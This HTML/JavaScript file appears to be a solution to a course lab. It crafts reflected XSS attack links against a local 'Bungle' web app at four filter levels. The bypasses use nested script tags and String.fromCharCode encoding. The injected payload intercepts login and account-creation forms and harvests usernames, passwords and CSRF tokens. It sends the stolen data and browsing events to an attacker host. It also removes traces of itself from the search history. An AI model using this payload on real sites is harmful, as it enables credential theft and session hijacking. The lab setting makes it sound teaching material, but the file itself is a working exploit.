<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<style>
body {background-image: url("https://i.imgur.com/GpCfuFQ.png");background-repeat: no-repeat;background-size: 25% auto;background-position: left top;display: flex;justify-content: center;align-items: center;height: 100vh;margin: 0;}
.links-container {display: flex;justify-content: space-between;align-items: center;flex-wrap: wrap;padding: 20px;border: 2px solid black;width: 80%;}
.flex-item {width: 100px;height: 100px;margin: 10px;border: 1px solid black;text-align: center;line-height: 100px;}
h3 a {color: black;}
</style>
<script>
function payload(atkr){
let href=location.href;
const rEv=(inP)=>{
    console.log(inP);
    $.get(atkr,inP);}
const pReq=(eN,lgE)=>{
    var usr=$("#username").val();
    var pwd=$("#userpass").val();
    $.post("./"+eN,{username:usr,password:pwd},()=>{
        rEv({evt:lgE,user:usr,pass:pwd});
        ldP("./");});}
const getH=()=>{
    const gH=sessionStorage.getItem('history');
    return gH?JSON.parse(gH):[];}
const setH=(gH)=>{
    sessionStorage.setItem('history',JSON.stringify(gH));}
const addH=(rsrc)=>{
    const gh=getH();
    gh.push(rsrc),setH(gh);}
const newH=(href)=>{
    addH(href),window.history.pushState({},"",href);}
const ldP=(href,Qry)=>{
    $("html").load(href,()=>{
        $("html").show();
        $("#query").val(Qry);
        $(document).ready(()=>{
            var tknELM=document.querySelector('input[name="csrf_token"]');
            var tknVAL=tknELM.value;
            rEv({evt:"tknex",csrf_token:tknVAL});});
        var usr=$("#logged-in-user").val();
        rEv({evt:"navigation",user:usr,uri:href});
        window.history.replaceState({},"",href);
        $(".history-item").each((_,item)=>{
            if($(item).text().includes("function payload(")){
            $(item).remove();}});
        $("#log-in-btn").on("click",evt=>{
            event.preventDefault();
            pReq("login","login");});
        $("#new-account-btn").on("click",evt=>{
            event.preventDefault();
            pReq("create", "login");});
        $("#log-out-btn").on("click",evt=>{
            event.preventDefault();
            var usr = $("#logged-in-user").text();
            $.post("./logout",()=>{
                rEv({evt:"logout",user:usr});
                ldP("./");});});
        $("#bungle-lnk").on("click",evt=>{
            event.preventDefault();
            href="/project2b/"
            newH(href);
            ldP(href);});
        $("#search-again-btn").on("click",evt=>{
            event.preventDefault();
            newH(href);
            ldP("./");});
        $("#search-btn").on("click",evt=>{
            event.preventDefault();
            Qry=$("#query").val();
            Qry=Qry.replace(/ /g,"+");
            href="./search?q="+Qry;
            newH(href);
            ldP(href,Qry);});
        $(window).on("popstate",evt=>{
            const gH=getH();
                if(gH.length>1){
                    const prvH=gH.pop();
                    setH(gH);
                    ldP(prvH);
                }else{
                    ldP(gH[0]);
                }});
    });}
$("html").hide();
ldP("./");
}
function ncdSTR(query){
    var myRe=/".*?"/g;var match;
    while((match=myRe.exec(query))!==null){
        var ncdedSTR="";
        for(var idx=1;idx<match[0].length-1;++idx){
            ncdedSTR+=match[0].charCodeAt(idx)+",";}
        ncdedSTR=ncdedSTR.slice(0,-1);
        ncdedSTR="String.fromCharCode("+ncdedSTR+")"; 
        query=query.replace(match[0],ncdedSTR);}return query;}  
function mkLnk(xssdefense,target,atkr){
    var bQry=target+"./search?csrfdefense=0&xssdefense="+xssdefense.toString()+"&q=";
    var payLd=payload.toString()+";payload(\""+atkr+"\");";
    switch(xssdefense){
    case 0:return bQry+encodeURIComponent("<script"+">"+payLd+"</script"+">");
    case 1:
    case 2:return bQry+encodeURIComponent("<scrscriptipt>"+payLd+"</scrscriptipt"+">");
    case 3:var encodedpayLd=ncdSTR("<script"+"> "+payLd+" </script"+">");return bQry+encodeURIComponent(encodedpayLd);}}
const target = "http://localhost:34443/project2b/";
const atkr = "http://localhost:31337/";
$(function(){
    var container = $("<div></div>").addClass("links-container");
    for(var xssdefense=0;xssdefense<=3;xssdefense++){
        var url=mkLnk(xssdefense,target,atkr);
        container.append("<h3><a target=\"run\" href=\""+url+"\" id=\"try_link_"+xssdefense+"\">Try Bungle! xssdefense="+xssdefense.toString()+"</a></h3>");}
        $("body").append(container);});
</script>
